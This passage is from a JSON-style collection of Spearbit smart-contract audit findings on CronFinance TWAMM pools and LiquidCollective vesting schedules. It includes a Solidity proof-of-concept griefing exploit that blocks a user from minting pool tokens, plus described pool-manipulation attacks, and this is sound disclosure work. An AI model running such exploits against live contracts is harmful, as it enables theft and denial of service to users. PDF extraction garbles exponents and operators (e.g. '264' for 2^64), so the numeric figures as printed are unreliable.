distort the pool. They lose about 155k in the process, but the LP loses far more, nearly all of which goes to the attacker--about 615,324 (sum of the losses of the two tokens since they're equally priced in this example). The attacker could be a significantly smaller proportion of the pool and still find this attack profitable. They could also JIT the liquidity since the early withdrawal penalty has been removed. The attack becomes infeasible for very large pools (has to happen over multiple TXs so can't flash loan --need own capital), but is relevant in practice.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "Loss of Long-Term Swap Proceeds Likely in Pools With Decimal or Price Imbalances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "This TWAMM implementation tracks the proceeds of long-term swaps efficiently via accumulated values called \"scaled proceeds\" for each token. In every order block interval (OBI), the scaled proceeds for e.g. the sale of token 0 are incremented by (quantity of token 1 purchased during the OBI) (cid:3)264= (sales rate of token 0 during the OBI) Then the proceeds of any specific long-term swap can be computed as the product of the difference between the scaled proceeds at the current block (or the expiration block of the order if filled) and the last block for which proceeds were claimed for the order and the order's sales rate, divided by 264: last := min(currentBlock, orderExpiryBlock) prev := block of last proceeds collection, or block order was placed in if this is the first withdrawal LT swap proceeds = (scaledProceedsl ast (cid:0) scaledProceedsprev ) (cid:3) (ordersalesrate)=264 The value 264 is referred to as the \"scaling factor\" and is intended to reduce precision loss in the division to determine the increment to the scaled proceeds. The addition to increment the scaled proceeds and the subtraction to compute its net change is both intentionally done with unchecked arithmetic--since only the difference matters, so long as at most one overflow occurs between claim-of-proceeds events for any given order, the computed proceeds will be correct (up to rounding errors). If two or more overflows occur, however, funds will be lost by the swapper (unclaimable and locked in the contract). Additionally, to cut down on gas costs, the scaled proceeds for the two tokens are packed into a single storage slot, so that only 128 bits are available for each value. This makes multiple overflows within the lifetime of a single order more likely. The CronFi team was aware of this at the start of the audit and specifically requested it be investigated, though they expected a maximum order length of 5 years to be sufficient to avoid the issue in practice. The scaling factor of 264 is approximately 1.8 (cid:3) 1019, close to the unit size of an 18-decimal token. It indeed works well if both pool tokens have similar decimals and relative prices that do not differ by too many orders of magnitude, as the quantity purchased and the sales rate will then be of similar magnitude, canceling to within a few powers of ten (2128 3.4 (cid:3) 1038, leaving around 19 orders of magnitude after accounting for the scaling factor). However, in pools with large disparities in price, decimals, or both, numerical issues are easy to encounter. The most extreme, realistic example would be a DAI-GUSD pool. DAI has 18 decimals while GUSD has only 2. We will treat the price of DAI and GUSD as equal for this analysis, as they are both stablecoins, and arbitrage of the TWAMM pool should prevent large deviations. Selling GUSD at a rate of 1000 per block, with an OBI of 64 (the stable pool order block interval in the audited commit) results in an increment of the scaled proceeds per OBI of: increment = (64 (cid:3) 1000 (cid:3) 1018) (cid:3) 264=(1000 (cid:3) 102) = 1.18 (cid:3) 1037 7 This will overflow an unsigned 128 bit integer after 29 OBIs; at 12 seconds per block, this means the first overflow occurs after 12 (cid:3) 64 (cid:3) 29 = 22272 seconds or about 6.2 hours, and thus the first double overflow (and hence irrevocable loss of proceeds if a withdrawal is not executed in time) will occur within about 12.4 hours (slightly but not meaningfully longer if the price is pushed a bit below 1:1, assuming a deep enough pool or reasonably efficient arbitrage). Since the TWAMM is intended to support swaps that take days, weeks, months, or even years to fill, without requiring constant vigilance from every long-term swapper, this is a strong violation of safety. A less extreme but more market-relevant example would be a DAI-WBTC pool. WBTC has 8 instead of 2 decimals, but it is also more than four orders of magnitude more valuable per token than DAI, making it only about 2 orders of magnitude \"safer\" than a DAI-GUSD pool. Imitating the above calculation with 20_000 DAI = 1 WBTC and selling 0.0025 WBTC (~$50) per block with a 257 block OBI yields: increment = (257 (cid:3) 50 (cid:3) 1018) (cid:3) 264=(0.0025 (cid:3) 108) = 9.48 (cid:3) 1035 OBI to overflow = ceiling(2128=(9.48 (cid:3) 1035)) = 359 time to overflow = 12 (cid:3) 257 (cid:3) 359 = 1107156 seconds = 307 hours = 12.8 days , or a little more than a day to encounter the second overflow. While less bad than the DAI-GUSD example, this is still likely of significant concern given that the CronFi team indicated these are parameters under which the TWAMM should be able to function safely and DAI-WBTC is a pair of interest for the v1 product. It is worth noting that these calculations are not directly dependent on the quantity being sold so long as the price stays roughly constant--any change in the selling rate will be compensated by a proportional change in the proceeds quantity as their ratio is determined by price. Thus the analysis depends only on relative price and relative decimals, to a good approximation--so a WBTC-DAI pool can be expected to experience an overflow roughly every two weeks at prevailing market prices, so long as the net selling rate is non-zero.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "An attacker can block any address from joining the Pool and minting BLP Tokens by filling the joinEventMap mapping.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "An attacker can block any address from minting BLP Tokens. This occurs due to the MAX_JOIN_- EVENTS limit, which is present in the JoinEventLib library. The goal for an attacker is to block a legitimate user from minting BLP Tokens, by filling the joinEventMap mapping. The attacker can fill the joinEventMap mapping by performing the following steps:  The attacker mints BLP Tokens from 50 different addresses.  Each address transfers the BLP Tokens, alongside the join events, to the user targeted with a call to the CronV1Pool(pool).transfer and CronV1Pool(pool).transferJoinEvent functions respectively. Those transfers should happen in different blocks. After 50 blocks (50 * 12s = 10 minutes) the attacker has blocked the legitimate user from minting _BLP Tokens_, as the maximum size of the joinEventMap mapping has been reached. 8 The impact of this vulnerability can be significant, particularly for smart contracts that allow users to earn yield by providing liquidity in third-party protocols. For example, if a governance proposal is initiated to generate yield by providing liquidity in a CronV1Pool pool, the attacker could prevent the third-party protocol from integrating with the CronV1Pool protocol. A proof-of-concept exploit demonstrating this vulnerability can be found below: function testGriefingAttack() public { console.log(\"-----------------------------\"); console.log(\"Many Users mint BLP tokens and transfer the join events to the user 111 in order to fill the array!\"); ,! for (uint j = 1; j < 51; j++) { _addLiquidity(pool, address(j), address(j), 2_000, 2_000, 0); vm.warp(block.timestamp + 12); vm.startPrank(address(j)); //transfer the tokens CronV1Pool(pool).transfer(address(111), CronV1Pool(pool).balanceOf(address(j))); //transfer the join events to the address(111) CronV1Pool(pool).transferJoinEvent(address(111), 0 , CronV1Pool(pool).balanceOf(address(j))); vm.stopPrank(); } console.log(\"Balance of address(111) before minting LP Tokens himself\", ,! ICronV1Pool(pool).balanceOf(address(111))); //user(111) wants to enter the pool _addLiquidity(pool, address(111), address(111), 5_000, 5_000, 0); console.log(\"Join Events of user address(111): \", ICronV1Pool(pool).getJoinEvents(address(111)).length); console.log(\"Balance of address(111) after adding the liquidity: \", ICronV1Pool(pool).balanceOf(address(111))); ,! ,! }", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "The executeVirtualOrdersToBlock function updates the oracle with the wrong block.number", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The executeVirtualOrdersToBlock is external, meaning anyone can call this function to execute virtual orders. The _maxBlock parameter can be lower block.number which will make the oracle malfunction as the oracle update function _updateOracle uses the block.timestamp and assumes that the update was called with the reserves at the current block. This will make the oracle update with an incorrect value when _maxBlock can be lower than block.number.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "The _join function does not check if the recipient is address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "As stated within the Balancer's PoolBalances.sol // The Vault ignores the `recipient` in joins and the `sender` in exits: it is up to the Pool to keep track of ,! // their participation. The recipient is not checked if it's the address(0), that should happen within the pool implementation. Within the Cron implementation, this check is missing which can cause losses of LPs if the recipient is sent as address(0). This can have a high impact if a 3rd party integration happens with the Cron pool and the \"joiner\" is mistakenly sending an address(0). This becomes more dangerous if the 3rd party is a smart contract implementation that connects with the Cron pool, as the default value for an address is the address(0), so the probability of this issue occurring increases.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Canonical token pairs can be griefed by deploying new pools with malicious admins", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "function create( address _token0, address _token1, string memory _name, string memory _symbol, uint256 _poolType, address _pauser ) external returns (address) { CronV1Pool.PoolType poolType = CronV1Pool.PoolType(_poolType); requireErrCode(_token0 != _token1, CronErrors.IDENTICAL_TOKEN_ADDRESSES); (address token0, address token1) = _token0 < _token1 ? (_token0, _token1) : (_token1, _token0); requireErrCode(token0 != address(0), CronErrors.ZERO_TOKEN_ADDRESSES); requireErrCode(getPool[token0][token1][_poolType] == address(0), CronErrors.EXISTING_POOL); address pool = address( new CronV1Pool(IERC20(_token0), IERC20(_token1), getVault(), _name, _symbol, poolType, ,! address(this), _pauser) ); //... Anyone can permissionlessly deploy a pool, with it then becoming the canonical pool for that pair of tokens. An attacker is able to pass a malicious _pauser the twamm pool, preventing the creation of a legitimate pool of the same type and tokens. This results in race conditions between altruistic and malicious pool deployers to set the admin for every token pair. 10 Malicious actors may grief the protocol by attempting to deploy token pairs with and exploiting the admin address, either deploying the pool in a paused state, effectively disabling trading for long-term swaps with the pool, pausing the pool at an unknown point in the future, setting fee and holding penalty parameters to inappropriate values, or setting illegitimate arbitrage partners and lists. This requires the factory owner to remove the admin of each pool individually and to set a new admin address, fee parameters, holding periods, pause state, and arbitrage partners in order to recover each pool to a usable condition if the griefing is successful.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Refund Computation in _withdrawLongTermSwap Contains A Risky Underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Nothing prevents lastVirtualOrderBlock from advancing beyond the expiry of any given long-term swap, so the unchecked subtraction here is unsafe and can underflow. Since the resulting refund value will be extremely large due to the limited number of blocks that can elapse and the typical prices and decimals of tokens, the practical consequence will be a revert due to exceeding the pool and order balances. However, this could be used to steal funds if the value could be maliciously tuned, for example via another hypothetical bug that allowed the last virtual order block or the sales rate of an order to be manipulated to an arbitrary value.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Function transferJoinEvent Permits Transfer-to-Self", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Though the error code indicates the opposite intent, this check will permit transfer-to-self (|| used instead of &&).", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "One-step owner change for factory owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The factory owner can be changed with a single transaction. As the factory owner is critical to managing the pool fees and other settings an incorrect address being set as the owner may result in unintended behaviors.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Factory owner may front run large orders in order to extract fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The factory owner may be able to front-run large trades in order to extract more fees if compromised or becomes malicious in one way or another. Similarly, pausing may also allow for skipping the execution of virtual orders before exiting.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Join Events must be explicitly transfered to recipient after transfering Balancer Pool Tokens in order to realize the full value of the tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Any user receiving LP tokens transferred to them must be explicitly transferred with a join event in order to redeem the full value of the LP tokens on exit, otherwise the address transferred to will automatically get the holding penalty when they try to exit the pool. Unless a protocol specifically implements transferJoinEvent function compatibility all LP tokens going through that protocol will be worth a fraction of their true value even after the holding period has elapsed.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Order Block Intervals(OBI) and Max Intervals are calculated with 14 second instead of 12 second block times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The CronV1Pool contract calculates both the Order Block Intervals (OBI) and the Max Intervals of the Stable/Liquid/Volatile pairs with 14 second block times. However, after the merge, 12 second block time is enforced by the Beacon Chain.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "One-step status change for pool Admins", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Admin status can be changed in a single transaction. This may result in unintended behaviour if the incorrect address is passed.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Incomplete token simulation in CronV1Pool due to missing queryJoin and queryExit functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "he CronV1Pool contract is missing the queryJoin and queryExit functions, which are significant for calculating maxAmountsIn and/or minBptOut on pool joins, and minAmountsOut and/or maxBptIn on pool exits, respectively. The ability to calculate these values is very important in order to ensure proper enforcement of slippage tolerances and mitigate the risk of sandwich attacks.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "A partner can trigger ROC update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A partner can trigger rook update if they return rook's current list within an update.  Scenario A partner calls updateArbitrageList, the IArbitrageurList(currentList).nextList() returns rook's rook- PartnerContractAddr and gets updated, the partner calls updateArbitrageList again, so this time isRook will be true.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Approved relayer can steal cron's fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A relayer within Balancer is set per vault per address. If feeAddr will ever add a relayer within the balancer vault, the relayer can call exitPool with a recipient of their choice, and the check on line 225 will pass as the sender will still be feeAddr but the true msg.sender is the relayer.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Price Path Due To Long-Term Orders Neglected In Oracle Updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The _updateOracle() function takes its price sample as the final price after virtual order execution for whatever time period has elapsed since the last join/exit/swap. Since the price changes continuously during that interval if there are long-term orders active (unlike in Uniswap v2 where the price is constant between swaps), this is inaccurate - strictly speaking, one should integrate over the price curve as defined by LT orders to get a correct sample. The longer the interval, the greater the potential for inaccuracy.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Vulnerabilities noted from npm audit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "npm audit notes: 76 vulnerabilities (5 low, 16 moderate, 27 high, 28 critical).", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Optimization: Merge CronV1Pool.sol & VirtualOrders.sol (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A lot of needless parameter passing is done to accommodate the file barrier between CronV1Pool & VirtualOrdersLib, which is an internal library. Some parameters are actually immutable variables.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Receive sorted tokens at creation to reduce complexity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Currently, when a pool is created, within the constructor, logic is implemented to determine if the to- kens are sorted by address. A requirement that is needed for Balancer Pool creation. This logic adds unnecessary gas consumption and complexity throughout the contract as every time amounts are retrieved from balancer, the Cron Pool must check the order of the tokens and make sure that the difference between sorted (Balancer) and unsorted (Cron) token addresses is handled. An example can be seen in onJoinPool uint256 token0InU112 = amountsInU112[TOKEN0_IDX]; uint256 token1InU112 = amountsInU112[TOKEN1_IDX]; Where the amountsInU112 are retrieved from the balancer as a sorted array, index 0 == token0 and index 1 == token1, but on the Cron side, we must make sure that we retrieved the correct amount based on the tokens being sent as sorted or not when the pool was created.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Remove double reentrancy checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A number of CronV1Pool functions include reentrancy checks, however, they are only callable from a Balancer Vault function that already has a reentrancy check.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "TWAMM Formula Computation Can Be Made Correct-By-Construction and Optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The linked lines are the core calculation of TWAMM virtual order execution. They involve checked arithmetic in the form of underflow-checked subtractions; there is thus a theoretical risk that rounding error could lead to a \"freezing\" of a TWAMM pool. One of the subtractions, that for token1OutU112, is already \"correct-by- construction\", i.e. it can never underflow. The calculation of token0OutU112 can be reformulated to be explicitly safe as well; the following overall refactoring is suggested: uint256 ammEndToken0 = (token1ReserveU112 * sum0) / sum1; uint256 ammEndToken1 = (token0ReserveU112 * sum1) / sum0; token0ReserveU112 = ammEndToken0; token1ReserveU112 = ammEndToken1; token0OutU112 = sum0 - ammEndToken0; token1OutU112 = sum1 - ammEndToken1; Both output calculations are now of the form x (cid:0) (x (cid:3) y)=(y + z) for non-negative x, y , and z, allowing subtraction operations to be unchecked, which is both a gas optimization and gives confidence the calculation cannot freeze up unexpectedly due to an underflow. Replacement of divDown by / gives equivalent semantics with lower overhead. An additional advantage of this formulation is its manifest symmetry under 0 < (cid:0) > 1 interchange; this serves as a useful heuristic check on the computation, as it should possess the same symmetry as the invariant.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Gas Optimizations In Bit Packing Functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The bit packing operations are heavily used throughout the gas-critical swap code path, the opti- mization of which was flagged as high-priority by the CronFi team. Thus they were carefully reviewed not just for correctness, but also for gas optimization. L119: unnecessary & due to check on L116 L175: could hardcode clearMask L203: could hardcode clearMask L240: could hardcode clearMask L241: unnecessary & due to check on line 237 L242: unnecessary & due to check on line 238 L292: could hardcode clearMask L328: could hardcode clearMask L343: unnecessary to mask when _isWord0 == true L359: unnecessary & operations due to checks on lines 356 and 357 L372: unnecessary masking L389: could hardcode clearMask L390: unnecessary & due to check on L387 L415: could 16 hardcode clearMask L416: unnecessary & operation due to check on line 413 L437: unnecessary clearMask L438: unnecessary & due to check on line 435 L464: could hardcode clearMask L465: unnecessary & due to check on line 462 Additionally, the following code pattern appears in multiple places: requireErrCode(increment <= CONST, CronErrors.INCREMENT_TOO_LARGE); value += increment; requireErrCode(value <= CONST, CronErrors.OVERFLOW); Unless there's a particular reason to want to detect a too-large increment separately from an overflow, these patterns could all be simplified to requireErrCode(CONST - value >= increment, CronErrors.OVERFLOW); value += increment; as any increment greater than CONST will cause overflow anyway and value is always in the correct range by construction. This allows CronErrors.INCREMENT_TOO_LARGE to be removed as well.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Using extra storage slot to store two mappings of the same information", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A second storage slot is used to store a duplicate mapping of the same token pair but in reverse order. If the tokens are sorted in a getter function then the second mapping does not need to be used.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Gas optimizations within _executeVirtualOrders function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Within the _executeVirtualOrders function there are a few gas optimizations that can be applied to reduce the contract size and gas consumed while the function is called. (!(virtualOrders.lastVirtualOrderBlock < _maxBlock && _maxBlock < block.number)) Is equivalent with: (virtualOrders.lastVirtualOrderBlock >= _maxBlock || _maxBlock >= block.number) This means that this always enters if _maxBlock == block.number which will result in unnecessary gas consump- tion. If cron fee is enabled, evoMem.feeShiftU3 will have a value meaning that the check on line 1536 is obsolete. Removing that check and the retrieve from storage will save gas.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Initializing with default value is consuming unnecessary gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Every variable declaration followed by initialization with a default value is gas consuming and obso- lete. The provided line within the context is just an example.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Factory requirement can be circumvented within the constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The constructor checks if the _factory parameter is the msg.sender. This behavior was, at first, created so that only the factory would be able to deploy pools. The check on line 484 is obsolete as pools deployed via the factory, will always have msg.sender == factory address, making the _factory parameter obsolete as well.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Usability: added remove, set pool functionality to CronV1PoolFactory (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Conversations with the audit team indicated functions were needed to manage pool mappings post- creation in the event that a pool needed to be deprecated or replaced.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Virtual oracle getter--gets oracle value at block > lvob (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Through the audit process, sufficient contract space became available to add an oracle getter con- venience that returns the oracle values and timestamps. However, this leaves the problem of not being able to get the oracle price at the current block in a pool with low volume but virtual orders active.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Loss of assets due to rounding during _longTermSwap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "When a long term swap (LT) is created, the selling rate for that LT is set based on the amount and the number of blocks that order will be traded for. uint256 lastExpiryBlock = block.number - (block.number % ORDER_BLOCK_INTERVAL); uint256 orderExpiry = ORDER_BLOCK_INTERVAL * (_orderIntervals + 1) + lastExpiryBlock; // +1 protects from div 0 ,! uint256 tradeBlocks = orderExpiry - block.number; uint256 sellingRateU112 = _amountInU112 / tradeBlocks; During the computation of the number of blocks, the order must trade for, defined as tradeBlocks, the order expiry is computed from the last expiry block based on the OBI (Order Block Interval). If tradeBlocks is big enough (it can be a max of 176102 based on the STABLE_MAX_INTERVALS ), then sellingRa- teU112 will suffer a loss due to solidity rounding down behavior. This is a manageable loss for tokens with big decimals but for tokens with low decimals, will create quite an impact. E.g. wrapped BTC has 8 decimals. the MAX_ORDER_INTERVALS can be max 176102 as per stable max intervals defined within the constants. that being said a user can lose quite a significant value of BTC: 0.00176101 This issue is marked as Informational severity as the amount lost might not be that significant. This can change in the future if the token being LTed has a big value and a small number of decimals.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Inaccuracies in Comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A number of minor inaccuracies were discovered in comments that could impact the comprehensi- bility of the code to future maintainers, integrators, and extenders. [1] bit-0 should be bit-1 [2] less than should be at most [3] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [4] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [5] on these lines unsold should be sold [6] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop 19 on line 54. [7] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop on line 111. [8] omitted should be emitted", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The Balancer protocol utilizes two types of swaps for its functionality - GIVEN_IN and GIVEN_OUT.  GIVEN_IN specifies the minimum amount of tokens a user would accept to receive from the swap.  GIVEN_OUT specifies the maximum amount of tokens a user would accept to send for the swap. However, the onSwap function of the CronV1Pool contract only accepts the IVault.SwapKind.GIVEN_IN value as the IVault.SwapKind field of the SwapRequest struct. The unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer on the Batch Swaps and the Smart Order Router functionality, as a single SwapKind is given as an argument.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "A pool's first LP will always take a minor loss on the value of their liquidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The first liquidity provider for a pool will always take a small loss on the value of their tokens deposited into the pool because 1000 balancer pool tokens are minted to the zero address on the initial deposit. As most tokens have 18 decimal places, this value would be negligible in most cases, however, for tokens with a high value and small decimals the effects may be more apparent.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "The _withdrawCronFees functions should revert if no fees to withdraw", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The _withdrawCronFees checks if there are any Cron Fees that need to be withdrawn, currently, this function does not revert in case there are no fees.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Schedule amounts cannot be revoked or released", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "The migration for schedule ids 9 to 12 has the following parameters: // 9 -> 12 migrations[3] = VestingScheduleMigration({ scheduleCount: 4, newStart: 0, newEnd: 1656626400, newLockDuration: 72403200, setCliff: true, setDuration: true, setPeriodDuration: true, ignoreGlobalUnlock: false }); The current start is 7/1/2022 0:00:00 and the updated/migrated end value would be 6/30/2022 22:00:00, this will cause _computeVestedAmount(...) to always return 0 where one is calculating the released amount due to capping the time by the end timestamp. And thus tokens would not be able to be released. Also these tokens cannot be revoked since the set [start, end] where end < start would be empty.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Low Risk"]}, {"title": "A revoked schedule might be able to be fully released before the 2 year global lock period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "The unlockedAmount calculated in _computeGlobalUnlocked(...) is based on the original sched- uledAmount. If a creator revokes its revocable vesting schedule and change the end time to a new earlier date, this formula does not use the new effective amount (the total vested amount at the new end date). And so one might be able to release the vested tokens before 2 years after the lock period.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Low Risk"]}, {"title": "Unlock date of certain vesting schedules does not meet the requirement", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "All vesting schedules should have the unlock date (start + lockDuration) set to 16/10/2024 0:00 GMT+0 post-migration. The following is the list of vesting schedules whose unlock date does not meet the requirement post-migration: Index Unlock Date 19,21,23 16/10/2024 9:00 GMT+0 36-60 16/10/2024 22:00 GMT+0", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Low Risk"]}, {"title": "ERC20VestableVotesUpgradeableV1._computeVestingReleasableAmount: Users VestingSchedule.releasedAmount > globalUnlocked will be temporarily denied of service with", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "The current version of the code introduces a new concept; global unlocking. The idea is that wher- ever IgnoreGlobalUnlockSchedule is set to false, the releasable amount will be the minimum value between the original vesting schedule releasable amount and the global unlocking releasable amount (the constant rate of VestingSchedule.amount / 24 for each month starting at the end of the locking period). The implementa- tion ,however, consists of an accounting error caused by a wrong implicit assumption that during the execution of _computeVestingReleasableAmount globalUnlocked should not be less than releasedAmount. In reality, how- In that case globalUnlocked - ever, this state is possible for users that had already claimed vested tokens. releasedAmount will revert for an underflow causing a delay in the vesting schedule which in the worst case may last for two years. Originally this issue was meant to be classified as medium risk but since the team stated that with the current deployment, no tokens will be released whatsoever until the upcoming upgrade of the TLC contract, we decided to classify this issue as low risk instead.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Low Risk"]}, {"title": "TlcMigration.migrate: Missing input validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "The upcoming change in some of the vesting schedules is going to be executed via the migrate function which at the current version of the code is missing necessary validation checks to make sure no erroneous values are inserted.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Low Risk"]}, {"title": "Optimise the release amount calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "In the presence of a global lock schedule one calculates the release amount as: LibUint256.min(vestedAmount - releasedAmount, globalUnlocked - releasedAmount)", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Gas Optimization"]}, {"title": "Use msg.sender whenever possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "checked to be equal to msg.sender: In this context the parameters vestingSchedule.{creator, beneficiary} have already been if (msg.sender != vestingSchedule.X) { revert LibErrors.Unauthorized(msg.sender); }", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Gas Optimization"]}, {"title": "Test function testMigrate uses outdated values for assertion", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "In commit fbcc4ddd6da325d60eda113c2b0e910aa8492b88, the newLockDuration values were up- dated in TLC_globalUnlockScheduleMigration.sol. However, the testMigrate function was not updated ac- cordingly and still compares schedule.lockDuration to the outdated newLockDuration values, resulting in failing assertions.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "Rounding Error in Unlocked Token Amount Calculation at ERC20VestableVotesUpgradea- ble.1.sol#L458", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "There is a rounding error in calculating the unlocked amount, which may lead to minor discrepancies in the tokens available for release.", "labels": 